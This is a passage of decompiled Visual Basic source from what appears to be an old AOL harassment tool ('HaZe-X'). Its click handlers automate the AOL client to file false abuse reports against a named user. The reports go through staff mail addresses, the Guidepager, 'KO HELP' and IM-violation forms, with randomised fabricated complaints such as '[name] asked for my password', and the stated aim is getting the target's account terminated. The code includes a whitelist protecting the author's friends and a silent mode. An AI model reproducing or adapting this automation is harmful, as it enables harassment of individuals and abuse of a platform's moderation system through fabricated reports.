l1154 = extfn24E0(l1152%, "Compose Mail")
DoEvents
Loop Until l1154 <> 0
l1158 = fn5D0(l114C(), l1154, "*", "_AOL_Edit", Null)
subF00 l114C(1), "LOTSEN AM"
subF00 l114C(3), "" & l1146$
l115C$ = Chr(10)
subF00 l114C(4), "" & Room & ":" & " " & "" & Text1 & l115C$ & l115C$
l115E = extfn24E0(l1154, "Send")
l1162 = extfn2518(l1154, "_AOL_Icon")
l1166 = extfn13D0(l1162, 2)
l116A = extfn13D0(l1166, 2)
l116E = extfn1750(l1162, c0074, 0, 0&)
l1172 = extfn1750(l1162, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • LOTSEN AM Completed."
subF38 .3#
sub30B0 "•-^v•HaZe-X²·³ [gold] • Super E-Mail Completed."
Call sub3208
For l1176 = 0 To Combo1.ListCount
l117A$ = Combo1.List(l1176)
If  Room = l117A$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub Silent_Click ()
If  Silent.Checked = True Then
Call sub34B0("Silent TOS now UN-Loaded.")
Silent.Checked = False
ElseIf Silent.Checked = False Then
Silent.Checked = True
Call sub34B0("Silent TOS now Loaded.")
End If
End Sub

Sub sp_Click ()
Dim l117C As Variant
Dim l1180() As Integer
Dim l1186 As Integer
Dim l1188 As Variant
Dim l118C As Variant
Dim l1190 As Variant
Dim l1194 As Variant
Dim l1198 As Variant
Dim l119C As Variant
Dim l11A0 As Variant
Dim l11A4 As Variant
Dim l11A8 As Variant
Dim l11AC As Integer
Dim l11AE As Variant
Dim l11B2 As Integer
Dim l11B4 As Variant
Dim l11B8 As Variant
Dim l11BC As Variant
Dim l11C0 As Variant
Dim l11C4 As Variant
Dim l11C8 As Integer
Dim l11CA As Integer
Dim l11CC As Integer
Dim l11CE As Integer
Dim l11D0 As Variant
Dim l11D4 As Variant
Dim l11D8 As Variant
Dim l11DC As Variant
Dim l11E0 As Variant
Dim l11E4 As Variant
Dim l11E8 As Variant
Dim l11EC As Variant
Dim l11F0 As Variant
Dim l11F4 As Variant
Dim l11F8 As String
Dim l11FA As Variant
Dim l11FE As Variant
Dim l1202 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
If  UCase$(l117C) Like "*KaOS*" Or UCase$(l117C) Like "*NiPP*" Or UCase$(l117C) Like "*CHOP*" Or UCase$(l117C) Like "*LoRe*" Or UCase$(l117C) Like "*CouNT*" Or UCase$(l117C) Like "*SoSo*" Or UCase$(l117C) Like "*TaLoN*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • StaffPager"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l1186% = extfn1520("AOL Frame25", 0&)
l1188 = extfn1520("AOL Frame25", 0&)
Call subD08("INVOKE DATABASE RECORD", "*")
Do
DoEvents
l118C = extfn24E0(l1188, "INVOKE DATABASE RECORD")
DoEvents
Loop Until l118C <> 0
l1190 = extfn2518(l118C, "_AOL_Icon")
l1194 = extfn2518(l118C, "_AOL_Edit")
l1198 = extfn1718(l1194, c07E6, 0, "40-22620")
subF38 .3#
l119C = extfn24E0(l1186%, "Invoke Database Record")
l11A0 = extfn2518(l119C, "_AOL_Button")
l11A4 = extfn24E0(l11A0, "OK")
subF38 .5#
l11A8 = extfn1750(l11A0, c0074, 0, 0&)
l11A8 = extfn1750(l11A0, c007C, 0, 0&)
subF38 .1#
l11AC% = extfn24E0(l1186%, "INVOKE DATABASE RECORD")
l11AE = extfn1750(l11AC%, c022E, 0, 0)
subF38 .9#
Do
DoEvents
l11B2% = extfn24E0(l1186%, "GUIDEPAGER FOR STAFF MEMBERS")
Loop Until l11B2% > 0
l11B4 = extfn24E0(l1186%, "guidepager for staff members")
l11B8 = fn5D0(l1180(), l11B4, "*", "_AOL_Icon", Null)
l11BC = l1180(3)
l11C0 = extfn1750(l11BC, c0074, 0, 0&)
l11C4 = extfn1750(l11BC, c007C, 0, 0&)
subF38 .1#
l11C8% = extfn24E0(l1186%, "GUIDEPAGER FOR STAFF MEMBERS")
l11AE = extfn1750(l11C8%, c022E, 0, 0)
DoEvents
l11CC% = extfn1750(l11CA%, c0074, 0, 0&)
l11CC% = extfn1750(l11CA%, c007C, 0, 0&)
subF38 .1#
Do
DoEvents
l11CE% = extfn24E0(l1186%, "Report Password Solicitations")
Loop Until l11CE% > 0
subF38 .1#
l11C8% = extfn24E0(l1186%, "GUIDEPAGER FOR STAFF MEMBERS")
l11AE = extfn1750(l11C8%, c022E, 0, 0)
l11D0 = extfn2518(l1186%, "_AOL_edit")
l11D4 = extfn14E8(l11D0, c0810)
l11D8 = extfn14E8(l11D4, c0810)
l11DC = extfn14E8(l11D8, c0810)
l11E0 = extfn14E8(l11DC, c0810)
l11E4 = extfn14E8(l11E0, c0810)
l11E8 = extfn14E8(l11E4, c0810)
l11EC = extfn14E8(l11E8, c0810)
l11F0 = extfn14E8(l11EC, c0810)
l11F4 = extfn1718(l11E8, c07E6, 0, Room)
l11F8$ = Chr(10)
l11F4 = extfn1718(l11F0, c07E6, 0, Room + ":" & " " & "" & Text1 & l11F8$ & l11F8$)
subF38 .3#
l11FA = extfn16E0(l11E8, c0218, 13, 0)
subF38 .7#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l11FE = 0 To Combo1.ListCount
l1202$ = Combo1.List(l11FE)
If  Room = l1202$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub spam_Click ()
Dim l1204 As Variant
Dim l1208 As Variant
Dim l120C As Variant
Dim l1210 As String
Dim l1212 As Variant
Dim l1216() As Integer
Dim l121C As Integer
Dim l121E As Variant
Dim l1222 As Variant
Dim l1226 As String
Dim l1228 As Variant
Dim l122C As Variant
Dim l1230 As Variant
Dim l1234 As Variant
Dim l1238 As Variant
Dim l123C As Variant
Dim l1240 As Variant
Dim l1244 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l1204 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l1208 = 6
    l120C = Int(Rnd * l1208 + 1)
      If  l120C = 1 Then l1210$ = "" & Form1.Room & " asked for my password."
      If  l120C = 2 Then l1210$ = "" & Form1.Room & " tried to hack my password."
      If  l120C = 3 Then l1210$ = "Read!" & Form1.Room & " asked for my password."
      If  l120C = 4 Then l1210$ = "Please do something about " & Form1.Room & "."
      If  l120C = 5 Then l1210$ = "This guy wants my password:" & Form1.Room
      If  l120C = 6 Then l1210$ = "Please help " & Form1.Room & " wants my password."
      If  l120C = 7 Then l1210$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l1212) Like "*KaOS*" Or UCase$(l1212) Like "*NiPP*" Or UCase$(l1212) Like "*CHOP*" Or UCase$(l1212) Like "*LoRe*" Or UCase$(l1212) Like "*CouNT*" Or UCase$(l1212) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOS Spam"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l121C% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l121E = extfn24E0(l121C%, "Compose Mail")
DoEvents
Loop Until l121E <> 0
l1222 = fn5D0(l1216(), l121E, "*", "_AOL_Edit", Null)
subF00 l1216(1), "TOS Spam"
subF00 l1216(3), "" & l1210$
l1226$ = Chr(10) + Chr(3)
subF00 l1216(4), "" & Room & ":" & " " & "" & Text1 & l1226$ & l1226$
l1228 = extfn24E0(l121E, "Send")
l122C = extfn2518(l121E, "_AOL_Icon")
l1230 = extfn13D0(l122C, 2)
l1234 = extfn13D0(l1230, 2)
l1238 = extfn1750(l122C, c0074, 0, 0&)
l123C = extfn1750(l122C, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l1240 = 0 To Combo1.ListCount
l1244$ = Combo1.List(l1240)
If  Room = l1244$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub staff_Click ()
Dim l1246 As Variant
Dim l124A As Variant
Dim l124E As Variant
Dim l1252 As String
Dim l1254 As Variant
Dim l1258() As Integer
Dim l125E As Integer
Dim l1260 As Variant
Dim l1264 As Variant
Dim l1268 As String
Dim l126A As Variant
Dim l126E As Variant
Dim l1272 As Variant
Dim l1276 As Variant
Dim l127A As Variant
Dim l127E As Variant
Dim l1282 As Variant
Dim l1286 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l1246 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l124A = 6
    l124E = Int(Rnd * l124A + 1)
      If  l124E = 1 Then l1252$ = "" & Form1.Room & " asked for my password."
      If  l124E = 2 Then l1252$ = "" & Form1.Room & " tried to hack my password."
      If  l124E = 3 Then l1252$ = "Read!" & Form1.Room & " asked for my password."
      If  l124E = 4 Then l1252$ = "Please do something about " & Form1.Room & "."
      If  l124E = 5 Then l1252$ = "This guy wants my password:" & Form1.Room
      If  l124E = 6 Then l1252$ = "Please help " & Form1.Room & " wants my password."
      If  l124E = 7 Then l1252$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l1254) Like "*KaOS*" Or UCase$(l1254) Like "*NiPP*" Or UCase$(l1254) Like "*CHOP*" Or UCase$(l1254) Like "*LoRe*" Or UCase$(l1254) Like "*CouNT*" Or UCase$(l1254) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSStaff1"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l125E% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1260 = extfn24E0(l125E%, "Compose Mail")
DoEvents
Loop Until l1260 <> 0
l1264 = fn5D0(l1258(), l1260, "*", "_AOL_Edit", Null)
subF00 l1258(1), "TOSStaff1"
subF00 l1258(3), "" & l1252$
l1268$ = Chr(10) + Chr(3)
subF00 l1258(4), "" & Room & ":" & " " & "" & Text1 & l1268$ & l1268$
l126A = extfn24E0(l1260, "Send")
l126E = extfn2518(l1260, "_AOL_Icon")
l1272 = extfn13D0(l126E, 2)
l1276 = extfn13D0(l1272, 2)
l127A = extfn1750(l126E, c0074, 0, 0&)
l127E = extfn1750(l126E, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l1282 = 0 To Combo1.ListCount
l1286$ = Combo1.List(l1282)
If  Room = l1286$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub supreme_Click ()
Dim l1288 As Integer
Dim l128A As Variant
Dim l128E As Variant
Dim l1292 As Variant
Dim l1296 As Variant
Dim l129A As Integer
Dim l129C As Variant
Dim l12A0 As Integer
Dim l12A2 As Variant
Dim l12A6 As Integer
Dim l12A8 As Variant
Dim l12AC As Variant
Dim l12B0 As Variant
Dim l12B4 As Variant
Dim l12B8 As Variant
Dim l12BC As Variant
Dim l12C0 As Variant
Dim l12C4 As Variant
Dim l12C8 As Variant
Dim l12CC As Variant
Dim l12D0 As Variant
Dim l12D4 As Variant
Dim l12D8 As Variant
Dim l12DC As String
Dim l12DE As Integer
Dim l12E0 As Variant
Dim l12E4 As Variant
Dim l12E8 As Variant
Dim l12EC As Variant
Dim l12F0 As Variant
Dim l12F4 As String
Dim l12F6 As Integer
Dim l12F8 As Variant
Dim l12FC As Variant
Dim l1300 As Variant
Dim l1304 As Variant
Dim l1308 As Variant
Dim l130C As Variant
Dim l1310 As Variant
Dim l1314 As Variant
Dim l1318 As Variant
Dim l131C As Variant
Dim l1320 As Variant
Dim l1324 As Variant
Dim l1328 As Variant
Dim l132C As Variant
Dim l1330 As Variant
Dim l1334 As Variant
Dim l1338 As Variant
Dim l133C As Variant
Dim l1340 As Variant
Dim l1344 As Variant
Dim l1348 As Variant
Dim l134C As Variant
Dim l1350 As Variant
Dim l1354 As Variant
Dim l1358 As Variant
Dim l135C As Variant
Dim l1360 As Variant
Dim l1364 As Variant
Dim l1368 As String
Dim l136A As Variant
Dim l136E() As Integer
Dim l1374 As Variant
Dim l1378 As Variant
Dim l137C As Variant
Dim l1380 As Variant
Dim l1384 As Variant
Dim l1388 As Variant
Dim l138C As Variant
Dim l1390 As Variant
Dim l1394 As Variant
Dim l1398 As Variant
Dim l139C As Variant
Dim l13A0 As Variant
Dim l13A4 As Variant
Dim l13A8 As Variant
Dim l13AC As Variant
Dim l13B0 As Integer
Dim l13B2 As Integer
Dim l13B4 As Variant
Dim l13B8 As Variant
Dim l13BC As Variant
Dim l13C0 As Integer
Dim l13C2 As Integer
Dim l13C4 As Integer
Dim l13C6 As Variant
Dim l13CA As String
MsgBox "This might kill your account.", , "Warning!"
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • Supreme TOS"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l128A = extfn24E0(l1288%, "Keyword")
Loop Until l128A <> 0
l128E = extfn2518(l128A, "_AOL_Edit")
l1292 = extfn1718(l128E, c07E6, 0, "GUIDEPAGER")
l1296 = extfn16E0(l128E, c0218, 13, 0)
Do
DoEvents
l129A% = extfn1520("AOL Frame25", 0&)
l129C = extfn24E0(l129A%, "I Need Help!")
Loop Until l129C > 0
l12A0% = extfn2518(l129C, "_AOL_ICON")
l12A2 = extfn1750(l12A0%, c0074, 0, 0)
l12A2 = extfn1750(l12A0%, c007C, 0, 0)
subF38 .1#
l12A6% = extfn24E0(l1288%, "I Need Help!")
l12A8 = extfn16E0(l12A6%, c022E, 0, 0)
Do
DoEvents
l12AC = extfn24E0(l1288%, "Report Password Solicitations")
Loop Until l12AC <> 0
l1292 = extfn16E0(l12B0, c022E, 0, 0)
l12B4 = extfn2518(l1288%, "_AOL_Edit")
l12B8 = extfn14E8(l12B4, c0810)
l12BC = extfn14E8(l12B8, c0810)
l12C0 = extfn14E8(l12BC, c0810)
l12C4 = extfn14E8(l12C0, c0810)
l12C8 = extfn14E8(l12C4, c0810)
l12CC = extfn14E8(l12C8, c0810)
l12D0 = extfn14E8(l12CC, c0810)
l12D4 = extfn14E8(l12D0, c0810)
l12D8 = extfn1718(l12CC, c07E6, 0, Room)
l12DC$ = Chr(10)
l12D8 = extfn1718(l12D4, c07E6, 0, Room + ":" & " " & "" & Text1 & l12DC$)
subF38 .3#
l1296 = extfn16E0(l12CC, c0218, 13, 0)
subF38 .5#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Guidepager Completed"
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l128A = extfn24E0(l1288%, "Keyword")
Loop Until l128A <> 0
l128E = extfn2518(l128A, "_AOL_Edit")
l1292 = extfn1718(l128E, c07E6, 0, "KO HELP")
l1296 = extfn16E0(l128E, c0218, 13, 0)
Do
DoEvents
l129A% = extfn1520("AOL Frame25", 0&)
l129C = extfn24E0(l129A%, "I Need Help!")
Loop Until l129C > 0
l12A0% = extfn2518(l129C, "_AOL_ICON")
l12A2 = extfn1750(l12A0%, c0074, 0, 0)
l12A2 = extfn1750(l12A0%, c007C, 0, 0)
subF38 .1#
l12A6% = extfn24E0(l1288%, "I Need Help!")
l12A8 = extfn16E0(l12A6%, c022E, 0, 0)
Do
DoEvents
l12DE% = extfn24E0(l1288%, "Report Password Solicitations")
Loop Until l12DE% > 0
l12E4 = extfn16E0(l12E0, c022E, 0, 0)
l12B4 = extfn2518(l1288%, "_AOL_edit")
l12B8 = extfn14E8(l12B4, c0810)
l12BC = extfn14E8(l12B8, c0810)
l12C0 = extfn14E8(l12BC, c0810)
l12C4 = extfn14E8(l12C0, c0810)
l12C8 = extfn14E8(l12C4, c0810)
l12CC = extfn14E8(l12C8, c0810)
l12D0 = extfn14E8(l12CC, c0810)
l12D4 = extfn14E8(l12D0, c0810)
l12A8 = extfn1718(l12C4, c07E6, 0, Room)
l12A8 = extfn1718(l12CC, c07E6, 0, Room + ":" & " " & "" & Text1 & Chr(10))
subF38 .3#
l1296 = extfn16E0(l12D0, c0218, 13, 0)
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • New KO Help Completed"
subF38 .3#
Randomize
For l12E8 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l12EC = 6
    l12F0 = Int(Rnd * l12EC + 1)
      If  l12F0 = 1 Then l12F4$ = "17"
      If  l12F0 = 2 Then l12F4$ = "2"
      If  l12F0 = 3 Then l12F4$ = "72"
      If  l12F0 = 4 Then l12F4$ = "53"
      If  l12F0 = 5 Then l12F4$ = "45"
      If  l12F0 = 6 Then l12F4$ = "11"
      If  l12F0 = 7 Then l12F4$ = "65"
      Next
Call subD08("Keyword...", "&Go To")
l12F6% = extfn1520("AOL Frame25", 0&)
Do
DoEvents
l12F8 = extfn24E0(l12F6%, "Keyword")
Loop Until l12F8 <> 0
l12FC = extfn2518(l12F8, "_AOL_Edit")
l1300 = extfn1718(l12FC, c07E6, 0, "Guidepager")
l1304 = extfn16E0(l12FC, c0218, 13, 0)
Do
DoEvents
l1308 = extfn24E0(l12F6%, "I Need Help!")
Loop Until l1308 <> 0
l130C = extfn2518(l1308, "_AOL_Icon")
l1310 = extfn13D0(l130C, 2)
l1314 = extfn13D0(l1310, 2)
l1318 = extfn13D0(l1314, 2)
l131C = extfn13D0(l1318, 2)
l1320 = extfn1750(l1314, c0074, 0, 0&)
l1324 = extfn1750(l1314, c007C, 0, 0&)
subF38 .1#
l12A6% = extfn24E0(l1288%, "I Need Help!")
Do
DoEvents
l1328 = extfn24E0(l12F6%, "Report A Violation")
Loop Until l1328 <> 0
l132C = extfn2518(10634, "_AOL_Icon")
SendKeys "{tab}" & " "
l12A8 = extfn16E0(l12A6%, c022E, 0, 0)
l1330 = extfn16E0(10634, c022E, 0, 0)
Do
DoEvents
l1334 = extfn24E0(l12F6%, "Violations via instant Messages")
Loop Until l1334 <> 0
subF38 .1#
l12A6% = extfn24E0(l1288%, "Report A Violation")
l12A8 = extfn16E0(l12A6%, c022E, 0, 0)
l12FC = extfn2518(l1334, "_AOL_Edit")
l1338 = extfn13D0(l12FC, 2)
l133C = extfn13D0(l1338, 2)
l1340 = extfn13D0(l133C, 2)
l1344 = extfn13D0(l1340, 2)
l1348 = extfn13D0(l1344, 2)
l134C = extfn13D0(l1348, 2)
l1350 = extfn13D0(l134C, 2)
l1354 = extfn13D0(l1350, 2)
l1300 = extfn1718(l12FC, c07E6, 0, Date)
l1300 = extfn1718(l133C, c07E6, 0, Time)
l1300 = extfn1718(l1344, c07E6, 0, Room + ":" & " " & Text1 & Chr(10))
subF38 .3#
l1358 = extfn2518(l1334, "_AOL_Button")
l1320 = extfn1750(l1358, c0074, 0, 0&)
l1324 = extfn1750(l1358, c007C, 0, 0&)
l135C = extfn16E0(l1334, c022E, 0, 0)
l135C = extfn16E0(l1308, c022E, 0, 0)
l135C = extfn16E0(l1328, c022E, 0, 0)
sub30B0 "•-^v•HaZe-X²·³ [gold] • IM Violation Complete"
subF38 .3#
Randomize
For l12E8 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l1360 = 6
    l1364 = Int(Rnd * l1360 + 1)
      If  l1364 = 1 Then l1368$ = "" & Form1.Room & " asked for my password."
      If  l1364 = 2 Then l1368$ = "" & Form1.Room & " tried to hack my password."
      If  l1364 = 3 Then l1368$ = "Read!" & Form1.Room & " asked for my password."
      If  l1364 = 4 Then l1368$ = "Please do something about " & Form1.Room & "."
      If  l1364 = 5 Then l1368$ = "This guy wants my password:" & Form1.Room
      If  l1364 = 6 Then l1368$ = "Please help " & Form1.Room & " wants my password."
      If  l1364 = 7 Then l1368$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l136A) Like "*KaOS*" Or UCase$(l136A) Like "*NiPP*" Or UCase$(l136A) Like "*CHOP*" Or UCase$(l136A) Like "*LoRe*" Or UCase$(l136A) Like "*CouNT*" Or UCase$(l136A) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TOSEmail2"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSEmail2 Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TOSEmail3"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSEmail3 Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TOSFileWrn"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSFileWrn Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TOSFiles1"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSFiles1 Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TOS IM1"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOS IM1 Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TOSStaff1"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSStaff1 Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TOSBoards1"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSBoards1 Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TOSNames1"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSNames1 Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "LOTSEN MI"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • LOTSEN MI Completed."
subF38 .3#
l1288% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1374 = extfn24E0(l1288%, "Compose Mail")
DoEvents
Loop Until l1374 <> 0
l1378 = fn5D0(l136E(), l1374, "*", "_AOL_Edit", Null)
subF00 l136E(1), "TOSChrisD"
subF00 l136E(3), "" & l1368$
l12DC$ = Chr(10)
subF00 l136E(4), "" & Room & ":" & " " & "" & Text1 & l12DC$ & l12DC$
l137C = extfn24E0(l1374, "Send")
l1380 = extfn2518(l1374, "_AOL_Icon")
l1384 = extfn13D0(l1380, 2)
l1388 = extfn13D0(l1384, 2)
l138C = extfn1750(l1380, c0074, 0, 0&)
l1390 = extfn1750(l1380, c007C, 0, 0&)
subF38 .4#
subFE0
